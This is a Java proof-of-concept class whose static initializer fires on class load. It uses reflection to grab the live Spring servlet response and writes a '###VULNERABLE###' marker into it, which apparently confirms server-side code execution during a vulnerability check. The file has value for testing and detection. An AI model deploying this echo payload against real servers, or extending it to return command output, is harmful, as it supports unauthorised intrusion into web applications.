public class poc {
	static {
		try {
			Class<?> requestContextHolderClass = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
			java.lang.reflect.Method getRequestAttributesMethod = requestContextHolderClass.getMethod("getRequestAttributes");
			Object attributes = getRequestAttributesMethod.invoke(null);
			Class servletRequestAttributesClass = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
			java.lang.reflect.Method getRequestMethod = servletRequestAttributesClass.getMethod("getRequest");
			Object request = getRequestMethod.invoke(attributes);
			java.lang.reflect.Field requestField = request.getClass().getDeclaredField("request");
			requestField.setAccessible(true);
			Object requeststraw = requestField.get(request);
			java.lang.reflect.Field responseField = requeststraw.getClass().getDeclaredField("response");
			responseField.setAccessible(true);
			Object responseraw = responseField.get(requeststraw);
			java.lang.reflect.Method setContentTypeMethod = responseraw.getClass().getDeclaredMethod("setContentType", java.lang.String.class);
			setContentTypeMethod.invoke(responseraw, "text/html");
			java.lang.reflect.Method setCharacterEncodingMethod = responseraw.getClass().getDeclaredMethod("setCharacterEncoding", java.lang.String.class);
			setCharacterEncodingMethod.invoke(responseraw, "utf-8");
			java.lang.reflect.Method getWriterMethod = responseraw.getClass().getDeclaredMethod("getWriter");
			Object writer = getWriterMethod.invoke(responseraw);
			java.lang.reflect.Method writeMethod = writer.getClass().getDeclaredMethod("write", java.lang.String.class);
			java.lang.reflect.Method closeMethod = writer.getClass().getDeclaredMethod("close");
			writeMethod.invoke(writer, "###VULNERABLE###");
			closeMethod.invoke(writer);
		} catch (Exception e) {
		}
	}
}
